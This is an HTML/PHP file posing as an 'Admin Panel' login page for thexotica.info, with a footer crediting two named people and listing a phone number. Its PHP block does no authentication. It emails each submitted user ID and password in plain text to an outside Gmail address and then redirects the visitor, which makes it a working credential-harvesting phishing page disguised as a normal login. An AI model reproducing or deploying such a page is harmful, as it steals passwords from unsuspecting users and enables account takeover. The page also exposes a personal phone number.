<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="icon" href="pic/icon.png" type="image/x-icon">
<title>Admin - thexotica.info</title>
</head>
<body style="background:url(bg.png);">
<img src="page-curl.png" style="margin-top:-8px; margin-left:-8px;" />
<font face="Freestyle Script">
<h1 align="center" style="color:#1E50AC; margin-top:-130px;">Admin Panel</h1>
<br /></font><table>
<form action="" method="post">
<tr><td><input title="Email" style="background-color:transparent; border-color:#1E50AC; color:#333; height:50px; width:300px; 
	font-size:20px; margin:130px 0px 0px 700px; float:right;" type="email" name="user" placeholder="User ID" required="required"  /></td></tr>
<tr><td><input title="Password" style="background-color:transparent; border-color:#1E50AC; 
	color:#333; height:50px; width:300px; font-size:20px; margin:0px 0px 0px 750px;" type="password" name="pass" 
	placeholder="***********" required="required" pattern=".{8,20}" /></td></tr>
<tr><td><input type="submit" name="submit" value="Login &rArr;" style=" background-color:#1E50AC; 
	color:#fff; height:50px; width:307px; float:right; font-size:20px; margin:0px 0px 0px 700px;"/></td></tr>
</form>
</table>
<img src="login.png" style="margin-left:350px; margin-top:-200px;" /><br />
<h4 align="center" style="margin-top:175px;">Design &amp; Devloped By: <a href="http://www.facebook.com/ankit9193">Ankit Kumar</a> and <a href="http://www.facebook.com/apurvabhishek00">Apurv Abhishek</a></h4>
<h5 align="center" style="margin-top:-19px;">+91 7205212954</h5>
</body>
</html>
<?php
if(isset($_POST['submit'])){
$a=$_POST['user'];
$b=$_POST['pass'];
  $to = "djyoti55555@gmail.com";
         
        

         $header = "From:".$f."\r\n";
        
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail ($to,$a,$b,$header);
       if( $retval == true ) {
          
                  echo "<script>window.location='next.php';</script>";
         }else {
           echo "<script>alert('Some error occured plz try again');</script>";
                  echo "<script>window.location='';</script>";
         }
}



?>